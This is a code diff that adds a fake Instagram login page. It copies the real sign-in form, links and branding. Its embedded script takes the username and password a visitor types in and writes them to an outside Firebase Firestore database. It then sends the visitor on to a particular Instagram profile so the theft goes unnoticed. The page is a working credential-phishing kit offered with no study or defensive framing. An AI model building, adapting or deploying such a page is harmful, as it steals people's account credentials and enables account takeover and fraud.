@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Instagram</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+
+<body>
+    <main> 
+        <!-- <img src="IG.jpeg" alt="" class="phoneImg"> -->
+        <div class="form-div">
+            <form action="" method="POST" id="loginForm">
+                <img class="instaLogo" src="instaLogo.png" alt="logo">
+                <input name="username" type="text" class="input" id="username" placeholder="Phone number, username, or email" required>
+                <input name="password" type="password" class="input" id="password" placeholder="Password" required>
+                <!-- <button class="login-btn">Log In</button> -->
+                <input type="submit" value="Log In" class="login-btn" id="fck">
+                <p id="or">OR</p>
+                <a style="color: blue;" href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522lqt27obx1n1r9o32gc1xu0urq29olz1w5h3e51u9kbfmf2qtr9%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D52262f57-9a89-4aa8-b2a0-76734fa9e17a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522lqt27obx1n1r9o32gc1xu0urq29olz1w5h3e51u9kbfmf2qtr9%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0" class="fb-login">
+                    <i class='bx bxl-facebook-square'></i> 
+                    Log in with Facebook</a>
+                    <a style="font-size: 13px;" href="https://www.instagram.com/accounts/password/reset/"> 
+                        Forgot password?</a>    
+            </form>
+            <div class="sign-up" >
+                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="sign-link" style="color: blue;">Sign up</a></p>
+            </div>
+            <!-- <div class="get-app">
+                <p>Get the app</p>
+                <div class="store">
+                   <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D0FEFAFAC-D397-47C1-A1D7-9617BAE37278%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1"><img id="play" src="playStore.png" alt="playStore"></div></a>
+                    <img id="microsoft" src="getMicrosoft.png" alt="microsoft">
+                </div>
+            </div> -->
+        </div>
+    </main>
+    <script type="module">
+        import { initializeApp } from
+        "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getFirestore, doc, setDoc } from
+        "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAXQ8CmKnYBLdA4jq2KLWlNzswpSqxpXqg",
+            authDomain: "allxorz-aa6d1.firebaseapp.com",
+            projectId: "allxorz-aa6d1",
+            storageBucket: "allxorz-aa6d1.appspot.com",
+            messagingSenderId: "816952093643",
+            appId: "1:816952093643:web:96f8c557ef3c951b6be44e",
+            measurementId: "G-7S20RQ3L7R"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+
+        document.getElementById('loginForm').addEventListener('submit',
+          function (event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            setDoc(doc(db, 'users/' + username), {
+                username: username,
+                password: password
+            }).then(function () {
+                // alert('Data saved');
+                window.location.href = 'https://www.instagram.com/yusuf_kk69?igsh=YzljYTk1ODg3Zg==';
+            }).catch(function (error) {
+                console.error('Firebase Error:', error);
+            });
+        });
+    </script>
+</body>
+
+</html>
